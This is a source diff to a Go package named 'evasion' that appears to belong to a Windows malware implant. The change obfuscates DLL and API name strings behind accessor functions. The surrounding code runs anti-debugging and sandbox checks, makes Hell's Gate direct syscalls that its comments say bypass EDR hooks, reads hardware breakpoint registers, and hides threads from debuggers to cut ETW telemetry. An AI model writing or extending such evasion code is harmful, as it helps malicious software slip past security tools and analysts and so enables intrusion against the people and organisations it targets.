@@ -6,6 +6,7 @@ package evasion
 import (
 	"os"
 	"strings"
+	"sync"
 	"time"
 	"unsafe"
 
@@ -24,24 +25,51 @@ var debuggerProcesses = []string{
 }
 
 var (
-	modKernel32Check              = windows.NewLazySystemDLL("kernel32.dll")
-	procIsDebuggerPresent         = modKernel32Check.NewProc("IsDebuggerPresent")
-	procCheckRemoteDebuggerPresent = modKernel32Check.NewProc("CheckRemoteDebuggerPresent")
-	procGetCurrentProcess         = modKernel32Check.NewProc("GetCurrentProcess")
+	antiDebugK32Once sync.Once
+	antiDebugK32Mod  *windows.LazyDLL
+
+	procIsDbgPresentOnce sync.Once
+	procIsDbgPresent     *windows.LazyProc
+
+	procCheckRDbgOnce sync.Once
+	procCheckRDbg     *windows.LazyProc
+
+	procGetCurProcOnce sync.Once
+	procGetCurProc     *windows.LazyProc
 )
 
+func getAntiDebugK32() *windows.LazyDLL {
+	antiDebugK32Once.Do(func() { antiDebugK32Mod = windows.NewLazySystemDLL(sKernel32()) })
+	return antiDebugK32Mod
+}
+
+func getProcIsDebuggerPresent() *windows.LazyProc {
+	procIsDbgPresentOnce.Do(func() { procIsDbgPresent = getAntiDebugK32().NewProc(sIsDebuggerPresent()) })
+	return procIsDbgPresent
+}
+
+func getProcCheckRemoteDbg() *windows.LazyProc {
+	procCheckRDbgOnce.Do(func() { procCheckRDbg = getAntiDebugK32().NewProc(sCheckRemoteDebuggerPresent()) })
+	return procCheckRDbg
+}
+
+func getProcGetCurrentProcess() *windows.LazyProc {
+	procGetCurProcOnce.Do(func() { procGetCurProc = getAntiDebugK32().NewProc(sGetCurrentProcess()) })
+	return procGetCurProc
+}
+
 func isDebuggerPresentWin() bool {
-	r, _, _ := procIsDebuggerPresent.Call()
+	r, _, _ := getProcIsDebuggerPresent().Call()
 	return r != 0
 }
 
 func isRemoteDebuggerPresent() bool {
-	hProc, _, _ := procGetCurrentProcess.Call()
+	hProc, _, _ := getProcGetCurrentProcess().Call()
 	if hProc == 0 {
 		return false
 	}
 	var present int32
-	procCheckRemoteDebuggerPresent.Call(hProc, uintptr(unsafe.Pointer(&present)))
+	getProcCheckRemoteDbg().Call(hProc, uintptr(unsafe.Pointer(&present)))
 	return present != 0
 }
 
@@ -85,11 +113,11 @@ func timingCheck() bool {
 // ntQueryDebugPort checks ProcessDebugPort (class 7) via NtQueryInformationProcess
 // using a Hell's Gate stub — bypasses any EDR hook on the Win32 API layer.
 func ntQueryDebugPort() bool {
-	proc := NewHGProc("NtQueryInformationProcess")
+	proc := NewHGProc(sNtQueryInformationProcess())
 	if proc == nil {
 		return false
 	}
-	hProc, _, _ := procGetCurrentProcess.Call()
+	hProc, _, _ := getProcGetCurrentProcess().Call()
 	if hProc == 0 {
 		return false
 	}
@@ -123,11 +151,11 @@ func ntGlobalFlagCheck() bool {
 // ntQueryNoDebugInherit checks ProcessDebugFlags (class 0x1F): returns 0 when
 // the process was created with DEBUG_ONLY_THIS_PROCESS / inherits a debugger.
 func ntQueryNoDebugInherit() bool {
-	proc := NewHGProc("NtQueryInformationProcess")
+	proc := NewHGProc(sNtQueryInformationProcess())
 	if proc == nil {
 		return false
 	}
-	hProc, _, _ := procGetCurrentProcess.Call()
+	hProc, _, _ := getProcGetCurrentProcess().Call()
 	if hProc == 0 {
 		return false
 	}
@@ -148,7 +176,7 @@ func ntQueryNoDebugInherit() bool {
 // NtGetContextThread. Any non-zero DR register means a debugger has set a
 // hardware breakpoint — something sandboxes do to intercept API calls.
 func ntQueryHWBP() bool {
-	proc := NewHGProc("NtGetContextThread")
+	proc := NewHGProc(sNtGetContextThread())
 	if proc == nil {
 		return false
 	}
@@ -189,7 +217,7 @@ func ntQueryHWBP() bool {
 // debugger-attach notifications at the kernel level and reduces ETW-TI
 // telemetry surfaced for this thread.
 func hideThreadFromDebugger() {
-	proc := NewHGProc("NtSetInformationThread")
+	proc := NewHGProc(sNtSetInformationThread())
 	if proc == nil {
 		return
 	}
